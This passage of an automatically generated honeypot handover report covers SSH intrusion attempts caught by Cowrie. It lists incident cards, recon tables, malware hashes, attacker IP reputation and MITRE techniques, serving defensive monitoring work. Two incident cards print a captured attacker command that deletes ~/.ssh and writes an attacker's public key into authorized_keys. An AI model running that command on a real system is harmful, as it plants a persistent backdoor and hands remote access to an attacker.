| `2026-05-05 07:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a89c0bebd6

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:23 |
| **Last Seen** | 2026-05-05 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:23:30` | `cowrie.session.connect` |
| `2026-05-05 07:23:30` | `cowrie.client.version` |
| `2026-05-05 07:23:31` | `cowrie.client.kex` |
| `2026-05-05 07:23:31` | `cowrie.login.success` |
| `2026-05-05 07:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba39ad660ef

| Field | Detail |
|---|---|
| **Source IP** | `180.252.199[.]166` |
| **First Seen** | 2026-05-05 08:57 |
| **Last Seen** | 2026-05-05 08:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 08:57:50` | `cowrie.session.connect` |
| `2026-05-05 08:57:50` | `cowrie.client.version` |
| `2026-05-05 08:57:50` | `cowrie.client.kex` |
| `2026-05-05 08:57:51` | `cowrie.login.success` |
| `2026-05-05 08:57:51` | `cowrie.session.params` |
| `2026-05-05 08:57:51` | `cowrie.command.input` |
| `2026-05-05 08:57:51` | `cowrie.command.failed` |
| `2026-05-05 08:57:51` | `cowrie.log.closed` |
| `2026-05-05 08:57:51` | `cowrie.session.params` |
| `2026-05-05 08:57:51` | `cowrie.command.input` |
| `2026-05-05 08:57:52` | `cowrie.session.file_download` |
| `2026-05-05 08:57:52` | `cowrie.log.closed` |
| `2026-05-05 08:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.199[.]166` to AbuseIPDB if not already reported
- [ ] Block `180.252.199[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf364e5df03c

| Field | Detail |
|---|---|
| **Source IP** | `180.252.199[.]166` |
| **First Seen** | 2026-05-05 08:57 |
| **Last Seen** | 2026-05-05 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 08:57:54` | `cowrie.session.connect` |
| `2026-05-05 08:57:54` | `cowrie.client.version` |
| `2026-05-05 08:57:54` | `cowrie.client.kex` |
| `2026-05-05 08:57:54` | `cowrie.login.success` |
| `2026-05-05 08:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.199[.]166` to AbuseIPDB if not already reported
- [ ] Block `180.252.199[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6eceb9fe6c2

| Field | Detail |
|---|---|
| **Source IP** | `180.252.199[.]166` |
| **First Seen** | 2026-05-05 09:57 |
| **Last Seen** | 2026-05-05 09:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 09:57:00` | `cowrie.session.connect` |
| `2026-05-05 09:57:00` | `cowrie.client.version` |
| `2026-05-05 09:57:00` | `cowrie.client.kex` |
| `2026-05-05 09:57:01` | `cowrie.login.success` |
| `2026-05-05 09:57:01` | `cowrie.session.params` |
| `2026-05-05 09:57:01` | `cowrie.command.input` |
| `2026-05-05 09:57:01` | `cowrie.command.failed` |
| `2026-05-05 09:57:01` | `cowrie.log.closed` |
| `2026-05-05 09:57:01` | `cowrie.session.params` |
| `2026-05-05 09:57:01` | `cowrie.command.input` |
| `2026-05-05 09:57:01` | `cowrie.session.file_download` |
| `2026-05-05 09:57:01` | `cowrie.log.closed` |
| `2026-05-05 09:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.199[.]166` to AbuseIPDB if not already reported
- [ ] Block `180.252.199[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38dd1a90c8fa

| Field | Detail |
|---|---|
| **Source IP** | `180.252.199[.]166` |
| **First Seen** | 2026-05-05 09:57 |
| **Last Seen** | 2026-05-05 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 09:57:03` | `cowrie.session.connect` |
| `2026-05-05 09:57:03` | `cowrie.client.version` |
| `2026-05-05 09:57:03` | `cowrie.client.kex` |
| `2026-05-05 09:57:04` | `cowrie.login.success` |
| `2026-05-05 09:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.199[.]166` to AbuseIPDB if not already reported
- [ ] Block `180.252.199[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `199.89.53[.]211` | **48** | 2026-05-05 09:37 | 2026-05-05 09:47 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `196.189.124[.]195` | **30** | 2026-05-05 06:44 | 2026-05-05 07:24 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.11.21[.]81` | **22** | 2026-05-05 06:39 | 2026-05-05 06:56 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `180.252.199[.]166` | **21** | 2026-05-05 08:26 | 2026-05-05 10:06 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.158.22[.]150` | **18** | 2026-05-05 06:20 | 2026-05-05 06:33 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `181.233.152[.]49` | **12** | 2026-05-05 06:43 | 2026-05-05 07:23 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `54.193.42[.]43` | **8** | 2026-05-05 09:30 | 2026-05-05 09:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `207.180.235[.]16` | **7** | 2026-05-05 07:27 | 2026-05-05 09:01 | 5m | 0 | `T1592` | 🟢 LOW |
| `43.160.200[.]19` | **7** | 2026-05-05 06:20 | 2026-05-05 06:25 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `64.150.187[.]164` | **6** | 2026-05-05 06:46 | 2026-05-05 06:49 | 3m | 0 | `T1592` | 🟢 LOW |
| `181.165.233[.]216` | **4** | 2026-05-05 08:48 | 2026-05-05 08:56 | 8m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-05 09:25 | 2026-05-05 09:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.33[.]23` | **2** | 2026-05-05 08:29 | 2026-05-05 08:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.156.83[.]235` | **2** | 2026-05-05 08:58 | 2026-05-05 08:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.251.179[.]44` | 1 | 2026-05-05 08:00 | 2026-05-05 08:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.113[.]93` | 1 | 2026-05-05 06:44 | 2026-05-05 06:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.26[.]3` | 1 | 2026-05-05 06:46 | 2026-05-05 06:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.180.213[.]221` | 1 | 2026-05-05 08:48 | 2026-05-05 08:48 | 19s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]209` | 1 | 2026-05-05 09:09 | 2026-05-05 09:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-05-05 10:06 | 2026-05-05 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-05-05 08:27 | 2026-05-05 08:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.236.108[.]125` | 1 | 2026-05-05 06:24 | 2026-05-05 06:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `62.169.16[.]137` | 1 | 2026-05-05 09:47 | 2026-05-05 09:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `84.247.185[.]10` | 1 | 2026-05-05 06:45 | 2026-05-05 06:45 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `84.247.185[.]10` | FR | Contabo GmbH | **100** ⚠️ | 2 |
| `181.165.233[.]216` | AR | Telecom Argentina S.A. | **100** ⚠️ | 1 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `54.193.42[.]43` | US | Amazon.com, Inc. | **100** ⚠️ | 1 |
| `181.233.152[.]49` | PE | TOTAL NETWORKS S.A. | **100** ⚠️ | 8 |
| `20.11.21[.]81` | AU | Microsoft Corporation | **100** ⚠️ | 0 |
| `207.180.235[.]16` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `46.236.108[.]125` | SE | Bredband2 AB | **100** ⚠️ | 9 |
| `180.252.199[.]166` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 3 |
| `196.189.124[.]195` | ET | Ethio Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 123 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 88 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 243 cases |
| Tool 34  | Credential Extractor        | ✅ 106 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (10.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 24 recon entry/entries in table (14 group(s) consolidating 189 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-05T10:07:20Z_
